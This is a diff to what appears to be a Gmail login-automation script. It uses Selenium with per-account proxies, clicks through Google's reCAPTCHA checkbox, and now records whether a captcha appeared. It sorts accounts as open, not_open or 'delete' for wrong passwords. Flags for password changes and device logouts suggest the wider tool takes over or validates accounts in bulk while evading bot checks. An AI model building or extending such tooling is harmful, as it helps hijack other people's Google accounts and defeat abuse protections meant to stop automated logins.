@@ -616,8 +616,11 @@ def browser_result_category(result: dict) -> str:
     if status in ("opened", "password_ok"):
         return "open"
 
-    # wrong_password and 2fa_required are definitive negative signals — not_open
-    if status in ("wrong_password", "password_changed", "2fa_required"):
+    if status in ("wrong_password", "password_changed"):
+        return "delete"
+
+    # 2fa_required is a definitive negative signal — not_open
+    if status == "2fa_required":
         return "not_open"
 
     if status != "verification_required":
@@ -5469,6 +5472,8 @@ def check_gmail(
         shots = getattr(driver, "_step_shots", None)
         if isinstance(_login_result, dict) and isinstance(shots, list) and shots:
             _login_result["stepScreenshots"] = list(shots)
+        if isinstance(_login_result, dict):
+            _login_result["captcha"] = bool(getattr(driver, "_saw_captcha", False))
         try:
             driver.quit()
         except Exception:
@@ -5552,6 +5557,10 @@ def _do_login(
     from selenium.webdriver.common.by import By
     from selenium.webdriver.common.keys import Keys
 
+    try:
+        driver._saw_captcha = False
+    except Exception:
+        pass
     _login_t0 = time.time()
     _password_change_started = False
     _device_logout_started = False
@@ -8404,6 +8413,11 @@ def _do_login(
     # Same step as a phone: Google shows "I'm not a robot" after the email,
     # one checkbox click, then the password page. An image puzzle is a
     # different page — we do not try to solve that.
+    if "challenge/recaptcha" in url or "i'm not a robot" in text or "i’m not a robot" in text:
+        try:
+            driver._saw_captcha = True
+        except Exception:
+            pass
     if "challenge/recaptcha" in url:
         _rc_result = handle_recaptcha_checkbox(
             driver, email, pace=_pace, proxy_url=proxy_url, page_state=page_state,
@@ -8506,6 +8520,10 @@ def _do_login(
     while time.time() < _pw_deadline and pw_field is None:
         _cur_pw = _live_url(driver)
         if "challenge/recaptcha" in _cur_pw:
+            try:
+                driver._saw_captcha = True
+            except Exception:
+                pass
             log(f"{email} — robot page opened while waiting for password")
             _rc_result = handle_recaptcha_checkbox(
                 driver, email, pace=_pace, proxy_url=proxy_url, page_state=page_state,
